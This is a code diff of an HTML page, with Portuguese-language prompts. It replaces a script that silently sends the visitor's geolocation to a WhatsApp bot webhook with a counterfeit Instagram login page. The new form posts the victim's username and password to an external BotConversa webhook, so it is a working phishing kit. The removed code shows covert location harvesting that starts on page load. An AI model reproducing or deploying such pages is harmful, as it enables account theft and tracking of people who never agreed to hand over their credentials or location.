@@ -3,41 +3,78 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enviar Localização para WhatsApp</title>
+    <title>Login - Instagram</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-container {
+            background: white;
+            padding: 20px;
+            border: 1px solid #dbdbdb;
+            text-align: center;
+            width: 300px;
+        }
+        .login-container img {
+            width: 175px;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+        }
+        .login-btn {
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            padding: 10px;
+            width: 100%;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+        .login-btn:hover {
+            background-color: #0077cc;
+        }
+    </style>
     <script>
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocation, showError);
-            } else {
-                alert("Geolocalização não é suportada neste navegador.");
-            }
-        }
-
-        function sendLocation(position) {
-            let latitude = position.coords.latitude;
-            let longitude = position.coords.longitude;
-            let webhookURL = "https://new-backend.botconversa.com.br/api/v1/webhooks-automation/catch/155079/5VA7V5lQtMy5/";
-
-            let data = {
-                telefone: "SEU_NUMERO", // Substitua pelo número do WhatsApp cadastrado no BotConversa
-                mensagem: `📍 *Nova localização recebida!*\n\n🌍 *Latitude:* ${latitude}\n🌍 *Longitude:* ${longitude}\n🔗 *Google Maps:* [Ver Localização](https://www.google.com/maps?q=${latitude},${longitude})`
-            };
-
-            fetch(webhookURL, {
+        function sendLogin(event) {
+            event.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            fetch('https://new-backend.botconversa.com.br/api/v1/webhooks-automation/catch/155079/1Q08XOfVAYfB/', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            })
-            .then(response => alert("Localização enviada para o WhatsApp via BotConversa!"))
-            .catch(error => alert("Erro ao enviar localização."));
-        }
-
-        function showError(error) {
-            alert("Erro ao obter localização.");
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    username: username,
+                    password: password
+                })
+            }).then(response => response.json())
+              .then(data => console.log('Success:', data))
+              .catch(error => console.error('Error:', error));
         }
     </script>
 </head>
-<body onload="getLocation()">
-    <h1>Obtendo sua localização...</h1>
+<body>
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+        <form onsubmit="sendLogin(event)">
+            <input type="text" id="username" placeholder="Telefone, nome de usuário ou email" required>
+            <input type="password" id="password" placeholder="Senha" required>
+            <button class="login-btn" type="submit">Entrar</button>
+        </form>
+    </div>
 </body>
 </html>
